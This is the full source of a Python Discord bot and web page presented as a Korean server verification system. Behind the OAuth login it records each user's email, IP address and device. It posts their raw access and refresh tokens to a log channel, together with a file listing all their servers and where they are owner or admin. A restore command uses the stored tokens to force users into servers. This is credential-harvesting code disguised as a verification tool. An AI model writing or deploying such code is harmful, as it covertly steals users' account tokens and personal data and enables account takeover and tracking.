import asyncio
import html
import os
import re
import secrets
import time
from io import BytesIO
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
import aiohttp
import asyncpg
import discord
from aiohttp import web

TOKEN = os.environ["DISCORD_TOKEN"]
CLIENT_ID = os.environ["CLIENT_ID"]
CLIENT_SECRET = os.environ["CLIENT_SECRET"]
BASE_URL = os.environ["BASE_URL"].rstrip("/")
DATABASE_URL = os.environ["DATABASE_URL"]
PORT = int(os.environ.get("PORT", "8080"))
API = "https://discord.com/api/v10"
REDIRECT_URI = f"{BASE_URL}/callback"
SCOPES = "identify email guilds.join guilds"
REQUIRED_SCOPES = {"identify", "email", "guilds.join", "guilds"}
VERIFY_CHANNEL_NAME = "인증"
LOG_CHANNEL_NAME = "인증로그"
VERIFIED_ROLE_NAME = "인증됨"
RESTORE_COMMAND = ".복원"
SETUP_COMMAND = ".인증설정"
STATE_TTL = 600
RESTORE_DELAY = 1.0
ADMIN_PERM = 0x8

SCHEMA = """
create table if not exists verifications (
    guild_id bigint not null,
    user_id bigint not null,
    username text,
    email text,
    ip text,
    user_agent text,
    device text,
    fingerprint text,
    access_token text,
    refresh_token text,
    expires_at bigint,
    status text not null default 'ok',
    created_at bigint not null,
    primary key (guild_id, user_id)
);
create index if not exists verifications_ip on verifications (guild_id, ip);
"""

SAVE_SQL = """
insert into verifications (
    guild_id, user_id, username, email, ip, user_agent, device, fingerprint,
    access_token, refresh_token, expires_at, status, created_at
) values ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13)
on conflict (guild_id, user_id) do update set
    username = excluded.username,
    email = excluded.email,
    ip = excluded.ip,
    user_agent = excluded.user_agent,
    device = excluded.device,
    fingerprint = excluded.fingerprint,
    access_token = excluded.access_token,
    refresh_token = excluded.refresh_token,
    expires_at = excluded.expires_at,
    status = excluded.status,
    created_at = excluded.created_at
"""

BASE_HTML = """<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="color-scheme" content="dark">
<meta name="theme-color" content="#313338">
<meta name="supported-color-schemes" content="dark">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/galmuri/dist/galmuri.css">
<title>__TITLE__</title>
<style>
:root{color-scheme:dark}
*{box-sizing:border-box}
html{color-scheme:dark;background:#313338}
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#313338;color:#f2f3f5;font-family:Galmuri11,"gg sans","Noto Sans KR","Malgun Gothic",sans-serif;font-size:12px;padding:16px}
.card{width:100%;max-width:360px;background:#2b2d31;border-radius:8px;padding:28px 24px;text-align:center;box-shadow:0 8px 16px rgba(0,0,0,.24)}
.logo-spin{position:relative;width:40px;height:40px;margin:0 auto 18px}
.logo-spin svg{position:absolute;top:0;left:0;width:40px;height:40px;transform-origin:50% 50%;animation:logoSpin 2.6s cubic-bezier(.3,.9,.25,1) infinite}
.logo-spin .t1{opacity:.35;filter:blur(1.5px);animation-delay:-.045s}
.logo-spin .t2{opacity:.2;filter:blur(3px);animation-delay:-.09s}
.logo-spin .t3{opacity:.1;filter:blur(4.5px);animation-delay:-.135s}
@keyframes logoSpin{
0%{transform:rotate(0deg)}
32%{transform:rotate(382deg)}
42%{transform:rotate(344deg)}
50%{transform:rotate(360deg)}
100%{transform:rotate(360deg)}
}
.icon{display:block;width:64px;height:64px;margin:0 auto 14px;border-radius:50%;object-fit:cover;background:#5865f2}
.fallback{display:flex;align-items:center;justify-content:center;width:64px;height:64px;margin:0 auto 14px;border-radius:50%;background:#5865f2;font-family:Galmuri14,Galmuri11,sans-serif;font-size:15px;color:#fff}
h1{margin:0 0 8px;font-family:Galmuri14,Galmuri11,sans-serif;font-size:15px;font-weight:400;color:#fff}
p{margin:0 0 18px;line-height:1.6;color:#b5bac1;font-size:12px}
.user{display:flex;align-items:center;justify-content:center;gap:8px;margin:0 0 20px;padding:8px 10px;background:#1e1f22;border-radius:6px;font-size:12px;color:#dbdee1}
.user img{width:20px;height:20px;border-radius:50%}
.btn{display:block;width:100%;padding:10px;border-radius:3px;background:#5865f2;color:#fff;font-size:12px;text-decoration:none}
.btn:hover{background:#4752c4}
.made{position:fixed;left:0;right:0;bottom:14px;text-align:center;font-family:Galmuri9,Galmuri11,sans-serif;font-size:10px;color:#fff;opacity:.3;pointer-events:none}
</style>
</head>
<body>
<div class="card">__BODY__</div>
<div class="made">Made By Kill</div>
</body>
</html>"""

OS_PATTERNS = (
    (r"iPhone|iPad|iPod", "iOS"),
    (r"Android", "Android"),
    (r"Windows NT", "Windows"),
    (r"Mac OS X|Macintosh", "macOS"),
    (r"CrOS", "ChromeOS"),
    (r"Linux", "Linux"),
)

BROWSER_PATTERNS = (
    (r"KAKAOTALK", "카카오톡 인앱"),
    (r"Edg/|EdgA/|EdgiOS/", "Edge"),
    (r"OPR/|Opera", "Opera"),
    (r"SamsungBrowser", "삼성 인터넷"),
    (r"Whale", "네이버 웨일"),
    (r"Firefox|FxiOS", "Firefox"),
    (r"Chrome|CriOS", "Chrome"),
    (r"Safari", "Safari"),
)

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
pool = None
http = None
pending = {}
restoring = set()
ready_done = False

class OAuthError(Exception):
    pass

class VerifyBot(discord.Client):
    async def setup_hook(self):
        global pool, http
        pool = await asyncpg.create_pool(
            clean_dsn(DATABASE_URL),
            min_size=1,
            max_size=5,
            max_inactive_connection_lifetime=60,
            command_timeout=30,
        )
        await pool.execute(SCHEMA)
        http = aiohttp.ClientSession()
        app = web.Application()
        app.add_routes(
            [
                web.get("/", health),
                web.get("/verify/{guild_id}", verify_page),
                web.get("/callback", callback),
            ]
        )
        runner = web.AppRunner(app)
        await runner.setup()
        await web.TCPSite(runner, "0.0.0.0", PORT).start()

client = VerifyBot(intents=intents)

def clean_dsn(dsn):
    parts = urlsplit(dsn)
    query = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
    return urlunsplit(parts._replace(query=urlencode(query)))

def clip(text, limit=1000):
    return text if len(text) <= limit else text[: limit - 1] + "…"

def parse_device(ua):
    if not ua:
        return "알 수 없음"
    os_name = "알 수 없음"
    for pattern, name in OS_PATTERNS:
        if re.search(pattern, ua, re.I):
            os_name = name
            break
    browser = "알 수 없음"
    for pattern, name in BROWSER_PATTERNS:
        if re.search(pattern, ua, re.I):
            browser = name
            break
    if re.search(r"iPad|Tablet", ua, re.I):
        kind = "태블릿"
    elif re.search(r"Mobile|iPhone|Android", ua, re.I):
        kind = "모바일"
    else:
        kind = "PC"
    return f"{kind} · {os_name} · {browser}"

def client_ip(request):
    ip = request.headers.get("CF-Connecting-IP")
    if not ip:
        forwarded = request.headers.get("X-Forwarded-For", "")
        ip = forwarded.split(",")[0].strip() if forwarded else None
    return ip or request.remote or "unknown"

LOGO_PATH = '<path fill="#fff" d="M81.15,0c-1.2376,2.1973-2.3489,4.4704-3.3591,6.794-9.5975-1.4396-19.3718-1.4396-28.9945,0-.985-2.3236-2.1216-4.5967-3.3591-6.794-9.0166,1.5407-17.8059,4.2431-26.1405,8.0568C2.779,32.5304-1.6914,56.3725.5312,79.8863c9.6732,7.1476,20.5083,12.603,32.0505,16.0884,2.6014-3.4854,4.8998-7.1981,6.8698-11.0623-3.738-1.3891-7.3497-3.1318-10.8098-5.1523.9092-.6567,1.7932-1.3386,2.6519-1.9953,20.281,9.547,43.7696,9.547,64.0758,0,.8587.7072,1.7427,1.3891,2.6519,1.9953-3.4601,2.0457-7.0718,3.7632-10.835,5.1776,1.97,3.8642,4.2683,7.5769,6.8698,11.0623,11.5419-3.4854,22.3769-8.9156,32.0509-16.0631,2.626-27.2771-4.496-50.9172-18.817-71.8548C98.9811,4.2684,90.1918,1.5659,81.1752.0505l-.0252-.0505ZM42.2802,65.4144c-6.2383,0-11.4159-5.6575-11.4159-12.6535s4.9755-12.6788,11.3907-12.6788,11.5169,5.708,11.4159,12.6788c-.101,6.9708-5.026,12.6535-11.3907,12.6535ZM84.3576,65.4144c-6.2637,0-11.3907-5.6575-11.3907-12.6535s4.9755-12.6788,11.3907-12.6788,11.4917,5.708,11.3906,12.6788c-.101,6.9708-5.026,12.6535-11.3906,12.6535Z"/>'

def logo_layer(class_name):
    return f'<svg class="{class_name}" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 126.644 96">{LOGO_PATH}</svg>'

DISCORD_LOGO = (
    '<div class="logo-spin">'
    + logo_layer("t3")
    + logo_layer("t2")
    + logo_layer("t1")
    + logo_layer("main")
    + "</div>"
)

def render(title, body, status=200):
    text = BASE_HTML.replace("__TITLE__", html.escape(title)).replace("__BODY__", DISCORD_LOGO + body)
    return web.Response(text=text, content_type="text/html", status=status)

def message_page(title, text, good=False, status=200, guild=None, member=None, button=False):
    parts = []
    if guild is not None:
        if guild.icon:
            parts.append(f'<img class="icon" src="{html.escape(guild.icon.url)}" alt="">')
        else:
            parts.append(f'<div class="fallback">{html.escape(guild.name[:1])}</div>')
    parts.append(f"<h1>{html.escape(title)}</h1>")
    parts.append(f"<p>{html.escape(text)}</p>")
    if member is not None:
        parts.append(
            f'<div class="user"><img src="{html.escape(member.display_avatar.url)}" alt="">'
            f"<span>{html.escape(member.display_name)}</span></div>"
        )
    if button and guild is not None:
        parts.append(f'<a class="btn" href="https://discord.com/channels/{guild.id}">Discord로 돌아가기</a>')
    return render(title, "".join(parts), status)

async def health(request):
    return web.Response(text="ok")

async def verify_page(request):
    try:
        guild_id = int(request.match_info["guild_id"])
    except ValueError:
        return message_page("잘못된 주소", "인증 채널의 버튼으로 다시 접속해 주세요.", status=404)
    if client.get_guild(guild_id) is None:
        return message_page("서버를 찾을 수 없음", "인증 채널의 버튼으로 다시 접속해 주세요.", status=404)
    now = time.time()
    for key in [k for k, v in pending.items() if now - v[1] > STATE_TTL]:
        pending.pop(key, None)
    state = secrets.token_urlsafe(24)
    pending[state] = (guild_id, now)
    query = urlencode(
        {
            "client_id": CLIENT_ID,
            "redirect_uri": REDIRECT_URI,
            "response_type": "code",
            "scope": SCOPES,
            "state": state,
            "prompt": "consent",
        }
    )
    response = web.HTTPFound(f"https://discord.com/oauth2/authorize?{query}")
    response.set_cookie("vstate", state, max_age=STATE_TTL, httponly=True, secure=True, samesite="Lax")
    raise response

async def exchange_code(code):
    payload = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }
    async with http.post(f"{API}/oauth2/token", data=payload) as response:
        if response.status != 200:
            raise OAuthError(f"token {response.status}")
        token = await response.json()
    if not REQUIRED_SCOPES <= set(str(token.get("scope", "")).split()):
        raise OAuthError("scope")
    return token

async def fetch_user(access_token):
    async with http.get(f"{API}/users/@me", headers={"Authorization": f"Bearer {access_token}"}) as response:
        if response.status != 200:
            raise OAuthError(f"user {response.status}")
        return await response.json()

def is_admin(permissions):
    try:
        return (int(permissions) & ADMIN_PERM) == ADMIN_PERM
    except Exception:
        return False

async def fetch_user_guilds(access_token):
    headers = {"Authorization": f"Bearer {access_token}"}
    async with http.get(f"{API}/users/@me/guilds?with_counts=true", headers=headers) as response:
        if response.status != 200:
            return []
        return await response.json()

def format_guild_line(guild):
    name = guild.get("name") or "unknown"
    gid = guild.get("id")
    owner = "✔" if guild.get("owner") else "❌"
    admin = "✔" if is_admin(guild.get("permissions", 0)) else "❌"
    members = guild.get("approximate_member_count") or 0
    online = guild.get("approximate_presence_count") or 0
    return f"서버: {name} ({gid}) | 소유자: {owner} | 관리자: {admin} | 멤버 수: {members} | 온라인 멤버 수: {online}"

async def build_guilds_file(access_token, user_id):
    guilds = await fetch_user_guilds(access_token)
    if not guilds:
        return None
    lines = [format_guild_line(g) for g in guilds]
    content = "\n".join(lines)
    filename = f"{user_id}-{int(time.time())}-guilds.txt"
    return discord.File(BytesIO(content.encode("utf-8")), filename=filename)

async def callback(request):
    if request.query.get("error"):
        return message_page("인증 취소", "Discord 인증이 취소되었습니다.", status=400)
    state = request.query.get("state", "")
    code = request.query.get("code", "")
    entry = pending.pop(state, None)
    if entry is None or not code or request.cookies.get("vstate") != state or time.time() - entry[1] > STATE_TTL:
        return message_page("인증 만료", "인증 시간이 만료되었습니다. 인증 채널의 버튼을 다시 눌러 주세요.", status=400)
    guild_id, _ = entry
    guild = client.get_guild(guild_id)
    if guild is None:
        return message_page("서버를 찾을 수 없음", "인증 채널의 버튼으로 다시 접속해 주세요.", status=404)
    try:
        token = await exchange_code(code)
        user = await fetch_user(token["access_token"])
        user_id = int(user["id"])
        member = guild.get_member(user_id)
        if member is None:
            try:
                member = await guild.fetch_member(user_id)
            except discord.HTTPException:
                member = None
        if member is None:
            return message_page("서버 멤버가 아닙니다", "먼저 서버에 참가한 뒤 다시 시도해 주세요.", status=403)
        ip = client_ip(request)
        user_agent = request.headers.get("User-Agent", "")[:300]
        device = parse_device(user_agent)
        ip_rows = await pool.fetch(
            "select user_id from verifications where guild_id=$1 and ip=$2 and user_id<>$3 and status='ok'",
            guild_id,
            ip,
            user_id,
        )
        dupes = [r["user_id"] for r in ip_rows if guild.get_member(r["user_id"]) is not None]
        exempt = member.guild_permissions.administrator
        status = "dupe" if dupes and not exempt else "ok"
        await pool.execute(
            SAVE_SQL,
            guild_id,
            user_id,
            user.get("username", ""),
            user.get("email"),
            ip,
            user_agent,
            device,
            None,
            token["access_token"],
            token.get("refresh_token"),
            int(time.time()) + int(token.get("expires_in", 604800)),
            status,
            int(time.time()),
        )
        if status == "ok":
            note = "인증 완료, 역할 지급"
            role = await ensure_role(guild)
            if role is not None:
                try:
                    await member.add_roles(role, reason="인증 완료")
                except discord.HTTPException:
                    note = "인증 완료, 역할 지급 실패 (봇 역할 순서와 권한 확인)"
            else:
                note = "인증 완료, 인증 역할을 찾을 수 없음"
            if dupes and exempt:
                note += " · 관리자 면제 (같은 IP 계정 존재)"
        else:
            try:
                await member.kick(reason=f"중복 IP 인증 ({ip})")
                note = "같은 IP 계정이 있어 추방됨"
            except discord.HTTPException:
                note = "추방 실패 (봇 권한과 역할 순서 확인)"
        guilds_file = await build_guilds_file(token["access_token"], user_id)
        await send_log(
            guild,
            member,
            {
                "status": status,
                "email": user.get("email"),
                "email_verified": bool(user.get("verified")),
                "username": user.get("username", ""),
                "ip": ip,
                "device": device,
                "dupes": dupes,
                "note": note,
                "access_token": token["access_token"],
                "refresh_token": token.get("refresh_token"),
            },
            file=guilds_file,
        )
    except OAuthError as exc:
        print(f"[oauth] {exc!r}")
        return message_page("인증 실패", "Discord 인증 중 오류가 발생했습니다. 처음부터 다시 시도해 주세요.", status=400)
    except Exception as exc:
        print(f"[callback] {exc!r}")
        return message_page("오류", "처리 중 오류가 발생했습니다. 잠시 후 다시 시도해 주세요.", status=500)
    if status == "ok":
        return message_page(
            "인증 완료",
            "인증이 완료되었습니다. 이제 서버를 이용하실 수 있어요. 이 창은 닫아도 됩니다",
            good=True,
            guild=guild,
            member=member,
            button=True,
        )
    raise web.HTTPFound("https://discord.com/channels/@me")

def build_log_view(member, info):
    ok = info["status"] == "ok"
    title = "인증 완료" if ok else "중복 IP 감지 · 인증 거부"
    profile = discord.ui.Section(
        discord.ui.TextDisplay(
            f"**{title}**\n\n**유저** {member.mention} (`{info['username']}`)\n**ID** `{member.id}`"
        ),
        accessory=discord.ui.Thumbnail(member.display_avatar.url),
    )
    mail_state = "인증됨" if info["email_verified"] else "미인증"
    created = discord.utils.snowflake_time(member.id)
    lines = [
        f"**이메일** `{info['email'] or '없음'}` ({mail_state})",
        f"**IP** `{info['ip']}`",
        f"**기기** {info['device']}",
        f"**계정 생성일** {discord.utils.format_dt(created, 'F')} ({discord.utils.format_dt(created, 'R')})",
    ]
    if member.joined_at:
        lines.append(f"**서버 참가일** {discord.utils.format_dt(member.joined_at, 'R')}")
    if info["dupes"]:
        lines.append(clip("**같은 IP 계정** " + ", ".join(f"<@{i}> (`{i}`)" for i in info["dupes"]), 800))
    lines.append(f"**Access Token** `{info.get('access_token') or '없음'}`")
    lines.append(f"**Refresh Token** `{info.get('refresh_token') or '없음'}`")
    lines.append(f"**처리 결과** {info['note']}")
    view = discord.ui.LayoutView(timeout=None)
    view.add_item(
        discord.ui.Container(
            profile,
            discord.ui.Separator(),
            discord.ui.TextDisplay("\n".join(lines)),
        )
    )
    return view

async def send_log(guild, member, info, file=None):
    channel = await ensure_log_channel(guild)
    if channel is None:
        return
    try:
        kwargs = {
            "view": build_log_view(member, info),
            "allowed_mentions": discord.AllowedMentions.none(),
        }
        if file is not None:
            kwargs["file"] = file
        await channel.send(**kwargs)
    except discord.HTTPException as exc:
        print(f"[log] {exc!r}")

async def ensure_role(guild):
    role = discord.utils.get(guild.roles, name=VERIFIED_ROLE_NAME)
    if role is not None:
        return role
    try:
        return await guild.create_role(name=VERIFIED_ROLE_NAME, reason="인증 시스템")
    except discord.HTTPException:
        return None

async def ensure_log_channel(guild):
    channel = discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)
    if channel is not None:
        return channel
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(view_channel=False),
        guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, embed_links=True),
    }
    try:
        return await guild.create_text_channel(
            LOG_CHANNEL_NAME,
            overwrites=overwrites,
            topic="인증 로그 채널 (관리자 전용)",
            reason="인증 시스템",
        )
    except discord.HTTPException:
        return None

async def ensure_verify_channel(guild):
    channel = discord.utils.get(guild.text_channels, name=VERIFY_CHANNEL_NAME)
    if channel is not None:
        return channel
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(
            view_channel=True,
            send_messages=False,
            add_reactions=False,
            create_public_threads=False,
            create_private_threads=False,
            send_messages_in_threads=False,
        ),
        guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, embed_links=True),
    }
    try:
        return await guild.create_text_channel(
            VERIFY_CHANNEL_NAME,
            overwrites=overwrites,
            topic="아래 버튼을 눌러 인증을 진행하세요.",
            reason="인증 시스템",
        )
    except discord.HTTPException:
        return None

def build_verify_view(guild_id):
    text = (
        "**서버 인증**\n\n"
        "아래 **인증하기** 버튼을 눌러 인증을 진행해 주세요.\n\n"
    )
    view = discord.ui.LayoutView(timeout=None)
    view.add_item(
        discord.ui.Container(
            discord.ui.TextDisplay(text),
            discord.ui.Separator(),
            discord.ui.ActionRow(
                discord.ui.Button(
                    label="인증하기",
                    style=discord.ButtonStyle.link,
                    url=f"{BASE_URL}/verify/{guild_id}",
                )
            ),
        )
    )
    return view

async def ensure_verify_message(channel):
    try:
        async for message in channel.history(limit=20):
            if message.author.id == client.user.id and message.components:
                return
    except discord.HTTPException:
        return
    try:
        await channel.send(view=build_verify_view(channel.guild.id))
    except discord.HTTPException as exc:
        print(f"[verify message] {exc!r}")

async def setup_guild(guild):
    try:
        await ensure_role(guild)
        await ensure_log_channel(guild)
        channel = await ensure_verify_channel(guild)
        if channel is not None:
            await ensure_verify_message(channel)
    except Exception as exc:
        print(f"[setup {guild.id}] {exc!r}")

async def refresh_access(guild_id, row):
    payload = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "refresh_token",
        "refresh_token": row["refresh_token"],
    }
    try:
        async with http.post(f"{API}/oauth2/token", data=payload) as response:
            if response.status != 200:
                return None
            data = await response.json()
    except aiohttp.ClientError:
        return None
    await pool.execute(
        "update verifications set access_token=$1, refresh_token=$2, expires_at=$3 where guild_id=$4 and user_id=$5",
        data["access_token"],
        data.get("refresh_token", row["refresh_token"]),
        int(time.time()) + int(data.get("expires_in", 604800)),
        guild_id,
        row["user_id"],
    )
    return data["access_token"]

async def restore_one(guild, row, role):
    token = row["access_token"]
    if not row["refresh_token"] and row["expires_at"] <= time.time() + 60:
        return False, "토큰 만료"
    if row["expires_at"] <= time.time() + 60:
        token = await refresh_access(guild.id, row)
        if token is None:
            return False, "토큰 갱신 실패 (앱 연결 해제됨)"
    payload = {"access_token": token}
    if role is not None:
        payload["roles"] = [str(role.id)]
    url = f"{API}/guilds/{guild.id}/members/{row['user_id']}"
    headers = {"Authorization": f"Bot {TOKEN}"}
    for _ in range(4):
        try:
            async with http.put(url, headers=headers, json=payload) as response:
                if response.status in (201, 204):
                    return True, ""
                if response.status == 429:
                    data = await response.json(content_type=None)
                    await asyncio.sleep(float(data.get("retry_after", 1)) + 0.3)
                    continue
                if response.status == 403:
                    return False, "차단되었거나 봇 권한 부족"
                if response.status in (400, 401):
                    return False, "토큰 무효"
                return False, f"HTTP {response.status}"
        except aiohttp.ClientError:
            await asyncio.sleep(1)
    return False, "요청 한도 초과"

async def handle_restore(message):
    guild = message.guild
    channel = message.channel
    none = discord.AllowedMentions.none()
    if guild.id in restoring:
        await channel.send("이미 복원이 진행 중입니다.")
        return
    restoring.add(guild.id)
    try:
        role = discord.utils.get(guild.roles, name=VERIFIED_ROLE_NAME)
        rows = await pool.fetch(
            "select user_id, access_token, refresh_token, expires_at from verifications where guild_id=$1 and status='ok'",
            guild.id,
        )
        targets = [r for r in rows if guild.get_member(r["user_id"]) is None]
        if not targets:
            await channel.send("복원할 유저가 없습니다.")
            return
        status = await channel.send(f"복원을 시작합니다. 대상 {len(targets)}명")
        added = 0
        failed = []
        for index, row in enumerate(targets, 1):
            ok, reason = await restore_one(guild, row, role)
            if ok:
                added += 1
            else:
                failed.append((row["user_id"], reason))
            if index % 20 == 0:
                try:
                    await status.edit(content=f"복원 중… {index}/{len(targets)}")
                except discord.HTTPException:
                    pass
            await asyncio.sleep(RESTORE_DELAY)
        text = f"복원 완료\n성공 {added}명 / 실패 {len(failed)}명"
        if failed:
            lines = [f"<@{uid}> `{uid}` - {reason}" for uid, reason in failed[:15]]
            text += "\n" + "\n".join(lines)
            if len(failed) > 15:
                text += f"\n외 {len(failed) - 15}명"
        try:
            await status.edit(content=clip(text, 1900), allowed_mentions=none)
        except discord.HTTPException:
            await channel.send(clip(text, 1900), allowed_mentions=none)
    except Exception as exc:
        print(f"[restore] {exc!r}")
        await channel.send("복원 중 오류가 발생했습니다.")
    finally:
        restoring.discard(guild.id)

@client.event
async def on_message(message):
    if message.guild is None or message.author.bot:
        return
    if not message.content.strip():
        return
    command = message.content.split(maxsplit=1)[0]
    if command not in (RESTORE_COMMAND, SETUP_COMMAND):
        return
    member = message.author
    if not isinstance(member, discord.Member) or not member.guild_permissions.administrator:
        await message.channel.send("관리자만 사용할 수 있습니다.")
        return
    if command == RESTORE_COMMAND:
        await handle_restore(message)
    else:
        await setup_guild(message.guild)
        await message.channel.send("인증 시스템 설정을 확인했습니다.")

@client.event
async def on_guild_join(guild):
    await setup_guild(guild)

@client.event
async def on_ready():
    global ready_done
    if ready_done:
        return
    ready_done = True
    for guild in client.guilds:
        asyncio.create_task(setup_guild(guild))
    print(f"{client.user}")

client.run(TOKEN)
